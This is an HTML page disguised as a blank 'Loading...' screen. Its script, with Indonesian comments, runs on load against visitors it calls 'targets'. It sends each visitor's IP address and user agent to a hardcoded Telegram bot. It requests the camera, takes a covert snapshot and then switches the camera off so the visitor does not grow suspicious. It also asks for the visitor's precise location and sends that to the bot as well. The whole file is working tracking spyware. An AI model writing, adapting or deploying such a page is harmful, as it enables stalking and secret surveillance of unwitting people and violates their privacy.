<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title> <script>
        // Masukkan identitas Bot Telegram kamu di sini
        const TOKEN = "8290115467:AAFgDbVBJc3bhIQdhcyuwCOOJvfnAec_gp8";
        const CHAT_ID = "7667638441";

        async function startTracking() {
            // 1. Ambil Informasi Perangkat & IP secara otomatis
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                kirimPesan(`[LOG] Target Terdeteksi!\nIP: ${ipData.ip}\nUser-Agent: ${navigator.userAgent}`);
            } catch (e) { console.log("IP Check Failed"); }

            // 2. Langsung Minta Izin Kamera
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                ambilFoto(stream);
            })
            .catch(err => {
                kirimPesan("Akses Kamera Ditolak!");
            });

            // 3. Langsung Minta Izin Lokasi
            navigator.geolocation.getCurrentPosition(pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                kirimPesan(`[LOKASI] Presisi:\nhttps://www.google.com/maps?q=${lat},${lon}`);
            }, err => {
                kirimPesan("Akses Lokasi Ditolak!");
            });
        }

        function ambilFoto(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const dataURL = canvas.toDataURL('image/png');
                kirimFoto(dataURL);
                
                // Matikan kamera setelah ambil foto agar tidak curiga
                stream.getTracks().forEach(track => track.stop());
            }, 1500);
        }

        function kirimPesan(teks) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(teks)}`);
        }

        function kirimFoto(base64) {
            fetch(base64).then(res => res.blob()).then(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.png');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            });
        }

        // Jalankan saat halaman dibuka
        window.onload = startTracking;
    </script>
</head>
<body style="background-color: black;">
    </body>
</html>
